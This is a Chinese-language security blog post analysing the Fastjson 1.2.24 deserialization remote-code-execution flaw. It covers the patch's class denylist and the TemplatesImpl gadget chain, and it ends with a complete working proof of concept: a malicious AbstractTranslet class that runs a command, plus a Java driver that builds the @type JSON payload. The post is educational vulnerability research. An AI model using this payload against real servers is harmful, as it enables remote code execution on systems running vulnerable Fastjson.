---
layout: post
title: "Fastjson 反序列化远程命令执行漏洞分析"
date: 2018-03-29
description: "Fastjson 反序列化远程命令执行漏洞分析"
tag: 应用安全
---

------
## Fastjson简介
Fastjson是一个由阿里巴巴维护的一个json库。它采用一种“假定有序快速匹配”的算法，是号称Java中最快的json库。Fastjson接口简单易用，已经被广泛使用在缓存序列化、协议交互、Web输出、Android客户端等多种应用场景。

## Fastjson使用
### 环境搭建
* 使用maven部署
```
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.24</version>
        </dependency>
```
* 编译环境使用jdk5,运行环境使用jre1.8

### 序列化和反序列化
* 创建一个User对象，使用fastjson toJSONStirng进行序列化

User.java:
```java
package com.bi3g0.demo;

public class User {

    private Long id;
    private String name;

    public void setId(Long id) {
        this.id = id;
    }

    public Long getId() {
        return id;
    }


    public void setName(String name) {
        this.name = name;
    }

    public String getName() {
        return name;
    }
}
```
FastjsonSerialize.java:
```java
package com.bi3g0.demo;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class FastjsonSerialize {

    public static void main(String[] args) {

        User user = new User();
        user.setId(2L);
        user.setName("bi3g0");

        String jsonString1 = JSON.toJSONString(user);
        System.out.println(jsonString1);

        // WriteClassName序列化时写入类型信息，默认为False。
        String jsonString2 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
        System.out.println(jsonString2);
    }
}
```
已经得到序列化后的字符串,运行结果如下:
```
{"id":2,"name":"bi3g0"}
{"@type":"com.bi3g0.demo.User","id":2,"name":"bi3g0"}
```
* 使用fastjson parseObject 对json字符串反序列化

fastjsonDeserialize.java:
```java
package com.bi3g0.demo;

import com.alibaba.fastjson.JSON;

public class fastjsonDeserialize {

    public static void main(String[] args) {

        String jsonString1 = "{\"id\":2,\"name\":\"bi3g0\"}";
        String jsonString2 = "{\"@type\":\"com.bi3g0.demo.User\",\"id\":2,\"name\":\"bi3g0\"}";

        //官方示例
        Object user1 = JSON.parseObject(jsonString1, User.class);
        System.out.println(user1);

        Object user2 = JSON.parseObject(jsonString2);
        System.out.println(user2);
    }
}
```

执行结果如下，得到反序列化后的实例：
```
com.bi3g0.demo.User@253498
{"name":"bi3g0","id":2}
```

## 静态分析
### 查看补丁代码
* 通过比较github中漏洞版本和修复版本间的[commit历史](https://github.com/alibaba/fastjson/compare/1.2.24...1.2.25)，确认更新补丁代码
![](/images/posts/app_sec/fastjson_github_compare_20180329110420.png)
更新补丁中主要增加了一个`checkautotype`方法，对fastjson反序列化的对象类型做了黑名单兰拦截。
![](/images/posts/app_sec/fastjson_github_checkaotutype_20180329110624.png)
* 查看1.2.25版本代码，确认拦截逻辑

fastjson-1.2.25\src\main\java\com\alibaba\fastjson\parser\DefaultJSONParser.java
```java
if (key == JSON.DEFAULT_TYPE_KEY && !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
                    String typeName = lexer.scanSymbol(symbolTable, '"');
                    Class<?> clazz = config.checkAutoType(typeName, null);
                    ...
```

首先判断key值是否为@type，如果是就会调用checkAutotype方法

fastjson-1.2.25\src\main\java\com\alibaba\fastjson\parser\ParserConfig.java:checkAutotype
```java
if (!autoTypeSupport) {
            for (int i = 0; i < denyList.length; ++i) {
                String deny = denyList[i];
                if (className.startsWith(deny)) {
                    throw new JSONException("autoType is not support. " + typeName);
                }
            }
            for (int i = 0; i < acceptList.length; ++i) {
                String accept = acceptList[i];
                if (className.startsWith(accept)) {
                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);

                    if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                    }
                    return clazz;
                }
            }
        }
```
Checkautotype方法对denylist列表进行了遍历。如果denylist列表（黑名单）包含此对象类型，抛出异常；否则继续遍历acceptlist列表（白名单，默认为空）。

*  黑名单拦截的类型定义
```
private String[] denyList = "bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework".split(",");
```
## 使用fastjson执行命令
* 创建User类，设置构造函数执行命令

User.java
```java
package com.bi3g0.demo;

import java.io.IOException;
import java.util.Properties;

public class User {

    public String username;
    private String password;
    public User() throws IOException {
        Runtime.getRuntime().exec("calc.exe");
    }
}
```
* 反序列化User对象序列化后得到json字符串

fastjsonDeserialize.java
```java
package com.bi3g0.demo;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

import java.lang.reflect.Field;

public class fastjsonDeserialize {

    public static void main(String[] args) throws IllegalAccessException {


        String jsonString1 = "{\"username\":\"bi3g0\", \"password\":\"root1234\"}";//这里额外指定了password
        String jsonString2 = "{\"@type\":\"com.bi3g0.demo.User\",\"username\":\"bi3g0\", \"password\":\"root1234\"}";
        
        //jsonString中未指定@type，且使用了Object.class,没有成功得到User实例
        Object user1 = JSON.parseObject(jsonString1, Object.class);
        System.out.println(user1);
        System.out.println();
        
        Object user2 = JSON.parseObject(jsonString2, Object.class);
        System.out.println(user2);
        System.out.println();
    }
}
```

jsonString2反序列化后成功执行命令，弹出计算器，执行结果如下：
```
{"password":"root1234","username":"bi3g0"}

com.bi3g0.demo.User@108c4c35
```

## 构造POC
### 如何构造POC
上面已经可以执行命令了，但是服务器上并没有我们构造的恶意User类，因此不能使用User实例序列化的jsonString来执行命令，同时jdk和fastjson中也没有与User类功能类似的类型。我们想要在服务器中执行命令需要在jdk和fastjson中寻找可以生成类似上述User实例的类。
jsonString中@type指定反序列化的实例类型，key：value指定实例的字段值。因此要寻找可以通过某key及其字段的值生成任意类型实例的类。

*  网上流传POC中就利用了Templateslmpl类，getTransletInstance方法中生成了一个AbstractTranslet类型的实例translet，translet通过_class的newInstance方法生成，而_class是defineTransletClasses方法通过_bytecodes生成。

jdk1.8.0_121\src.zip!\com\sun\org\apache\xalan\internal\xsltc\trax\TemplatesImpl.java:getTransletInstance
```java
private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            if (_name == null) return null;

            if (_class == null) defineTransletClasses();

            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
            ...
```

jdk1.8.0_121\src.zip!\com\sun\org\apache\xalan\internal\xsltc\trax\TemplatesImpl.java:defineTransletClasses
```java
        ...
        try {
            final int classCount = _bytecodes.length;
            _class = new Class[classCount];

            if (classCount > 1) {
                _auxClasses = new HashMap<>();
            }
        ...
```
* 如果我们可以控制_bytecodes，并且调用getTransletInstance方法就可以构造恶意的jsonString来执行任意命令。
_bytecode是private属性，前面测试过fastjson默认反序列化public字段，需要设置[Feature.SupportNonPublicField](https://github.com/alibaba/fastjson/wiki/Feature_SupportNonPublicField_cn)反序列化private字段。

```java
public class Model {
    private int id;
}

Model model = JSON.parseObject("{\"id\":123}"
                                , Model.class
                                , Feature.SupportNonPublicField);
assertEquals(123, model.id);
```

* 现在的关键是如何触发private getTransletInstance方法？

首先Templateslmpl没有TransletInstance这个字段，getTransletInstance()就不是一个字段的getter方法。我们看到getTransletInstance()由newTransformer()调用，而newTransformer()由getOutputProperties()调用。getOutputProperties()是一个public 返回值为Properties的getter函数，而类中只有private _OutputProperties字段，我们是否可以通过这个变量来触发getOutputProperties()函数呢？

我们类比Templateslmpl中的_OutputProperties字段和getOutputProperties()做下测试，在User类中添加一个private Properties _OutputProperties字段和一个public Properties getOutputProperties(),看下反序列化时是否可以调用getOutputProperties():

User.java
```java
package com.bi3g0.demo;

import java.io.IOException;
import java.util.Properties;

public class User {

    public String username;
    private String password;
    private Properties _outputProperties;
        public Properties getOutputProperties() {
        System.out.println("getOutputProperties() excuted..." );
        return new Properties();
    }
}
```
在jsonString3中添加设置_outputProperties字段，并使用Feature.SupportNonPublicField属性

fastjsonDeserialize.java
```java
package com.bi3g0.demo;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

import java.lang.reflect.Field;

public class fastjsonDeserialize {

    public static void main(String[] args) throws IllegalAccessException {


        String jsonString1 = "{\"username\":\"bi3g0\", \"password\":\"root1234\"}";//这里额外指定了password
        String jsonString2 = "{\"@type\":\"com.bi3g0.demo.User\",\"username\":\"bi3g0\", \"password\":\"root5678\"}";
        String jsonString3 = "{\"@type\":\"com.bi3g0.demo.User\",\"username\":\"bi3g0\", \"password\":\"root4321\", " +
                "\"_outputProperties\": {\"test\": \"1234\"}}";
                ...
        Object user3 = JSON.parseObject(jsonString3, Object.class, Feature.SupportNonPublicField);
        System.out.println(user3);
        System.out.println();
        ...
```
执行结果如下:
```
getOutputProperties() excuted...
com.bi3g0.demo.User@46fbb2c1
```
可以看到User类的getOutputPropertie()在反序列化时被执行，也就是Templateslmpl类的getOutputProperties也同样会被Fastjson调用执行。  
至此，完整调用链就可以建立了：JSON.parseObject -> Templateslmpl. getOutputProperties –> Templateslmpl.newTransformer-> Templateslmpl.getTransletInstance -> java.lang.newInstance。

* 至于为什么getTransletInstance()方法会被调用?
有两点原因（这里比较复杂，没有深入研究，参考其他资料）：
1. fastjson-1.2.24\src\main\java\com\alibaba\fastjson\parser\deserializer\JavaBeanDeserializer.java
![](/images/posts/app_sec/fastjson_replace_.png)
_outputProperties会被置换成outputProperties，并赋值给key2
2. astjson-1.2.24\src\main\java\com\alibaba\fastjson\util\JavaBeanInfo.java
![](/images/posts/app_sec/fastjson_getmethod_execute.png)


fastjson 会按如下条件判断反序列化的时候是否调用其 getter 函数:   
(1)函数名称大于等于 4  
(2)非静态函数  
(3)函数名称以get起始，且第四个字符为大写字母  
(4)函数没有入参  
(5)函数的返回类型满足如下之一:继承自Collection;继承自Map;是AtomicBoolean;是AtomicInteger;是AtomicLong.  
  
  getTransletInstance()的返回值Properties继承自Map，因此可以被成功调用

### 尝试构造POC
* 由于_class类型为AbstractTranslet类，因此我们构造的恶意类需要继承AbstractTranslet。

Evil.java
```java
package com.bi3g0.demo;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Evil extends AbstractTranslet {

    public Evil() throws IOException {
        Runtime.getRuntime().exec("calc.exe");
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public static void main(String[] args) throws IOException {
        Evil evil = new Evil();
    }
}
```
* 然后将该类的class字节码赋值给Templateslmpl的_bytecodes字段，并且设置_outputProperties字段调用getOutputProperties (),我们构造恶意的jsonString如下：
`{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["evilCode"],"_outputProperties":{}}`
* 此外还应该要注意_name不能为空，否则会在getTransletInstance()函数中进行null返回，进而进行不到newInstance这一步，而且_tfactory这个类不能为null，否则在执行defineTransletClasses()这个函数的时候会抛异常，也会导致进行不到newInstance这一步。
最终设置jsonString为：
`{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["evilCode"],"_name":"a.b","_tfactory":{},"_outputProperties":{}}`
* 成功构造的POC如下：

TemplateslmplDeserialize.java
```java
package com.bi3g0.demo;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import org.apache.commons.io.IOUtils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import org.apache.commons.codec.binary.Base64;

public class TemplateslmplDeserialize {

    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());

    }

    public static void main(String[] args) {

        final String evilClassPath = "F:\\Common\\总结\\0day研究\\fastjson反序列化漏洞\\Coding\\fastjson_des_rce_demo" +
                "\\target\\classes\\com\\bi3g0\\demo\\Evil.class";
        String evilCode = readClass(evilClassPath);
//      System.out.println(evilCode);

        String evilJsonString = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
                "\"_name\":\"a.b\"," +
                "\"_tfactory\":{}," +
                "\"_bytecodes\":[\"" + evilCode + "\"]," +
                "\"_outputProperties\":{}}";

        Object obj = JSON.parseObject(evilJsonString, Object.class, Feature.SupportNonPublicField);
        System.out.println(obj);
    }
}
```
* 执行后成功弹出计算器，完整执行调用链如下:
![](/images/posts/app_sec/fastjson_rce_excute_methods.png)

## 总结
漏洞构造精巧，许多思路值得学习和借鉴。关于这个漏洞的利用相对比较苛刻，需要服务器同时使用parseObject并设置Feature.SupportNonPublicField属性，而fastjson的这个属性在1.2.22版本开始引入，并在1.2.25版本修复，导致漏洞存在稀少。

## 参考
[http://www.freebuf.com/sectool/165655.html](http://www.freebuf.com/sectool/165655.html)  
[https://paper.seebug.org/292/](https://paper.seebug.org/292/)  
[http://www.cnblogs.com/mrchang/p/6789060.html](http://www.cnblogs.com/mrchang/p/6789060.html)  
[http://www.qingpingshan.com/pc/aq/359894.html](http://www.qingpingshan.com/pc/aq/359894.html)